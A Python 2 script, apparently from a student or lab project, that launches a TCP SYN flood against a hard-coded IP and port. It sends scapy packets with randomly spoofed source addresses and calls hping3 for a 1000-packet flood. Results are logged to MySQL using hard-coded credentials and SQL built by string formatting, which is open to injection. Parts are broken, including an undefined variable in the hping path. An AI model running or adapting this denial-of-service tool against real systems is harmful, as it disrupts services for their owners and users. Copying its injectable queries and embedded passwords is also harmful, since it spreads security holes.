#coding=utf-8
import os
import re
import socket
import MySQLdb
from scapy.all import *
from subprocess import Popen, PIPE
import socket, sys, random, threading
from SimpleXMLRPCServer import SimpleXMLRPCServer



scapy.config.conf.iface = 'lo'
count = 0
targets = '172.29.153.60'
ports = 80
reasult='已攻击1000次'
task_ids='1'





def write_to_mysql(task_id, reasult):	
	try:
		db = MySQLdb.connect(host="192.168.1.117",user="tcphalf",passwd="hitwh",db="information" ,charset='utf8')
	except:
		print '数据库连接失败!'
	cursor = db.cursor()

	try:
		sqls = "update mainpage_tcphalf set result = '%s'   where id ='%s' "%(reasult,task_id)
		sqls2 = "update mainpage_tcphalf set status='1'  where id ='%s' "%task_id
		cursor.execute(sqls)
		db.commit()
		cursor.execute(sqls2)
		db.commit()
	except:
		print '写入数据库失败!'
	try:
		#cursor.execute(sql)
		db.commit()
		print '写入数据库成功!'
	except:
		db.rollback()
	db.close


def sendSYN(target, port,task_id):
		isrc = '%i.%i.%i.%i' % (random.randint(1,254),random.randint(1,254),random.randint(1,254), random.randint(1,254))
		isport = random.randint(1,65535)
		ip = IP(src = isrc,dst = target)
		syn = TCP(sport = isport, dport = port, flags = 'S')
		i = 0
		while i < 10:
			  i += 1       
			  send(ip / syn, verbose = 0)

def tcp_attack(target, port,task_id):
	   print '目标:%s    端口:%d     攻击开始!' %(target,port)
	   print '攻击开始!' 
	   sendSYN(target, port,task_id)
	   write_to_mysql(task_id, reasult)
	   print '攻击成功'
	   return 1

def tcp_attack_hping(target, port,task_id):
	print '目标:%s    端口:%d     攻击开始!' %(target,port)
	print '攻击开始!' 
	ip = socket.gethostbyname(socket.gethostname())
	orders=' hping3 -i u1000 -c 1000 -p %d -S  %s' %(port,target)
	order_base='iptables -I INPUT --dst %s -j DROP' %ip
	resp = os.system(orders_base)
	resp = os.system(orders)
	print '攻击成功'
	return 1

	resp = os.system(orders)

if __name__ == '__main__':
	tcp_attack_hping(targets, ports,task_ids)
	#server=SimpleXMLRPCServer(("192.168.1.113",8888))
	#server.register_multicall_functions()
	#server.register_function(tcp_attack,'tcp_attack')
	#server.serve_forever()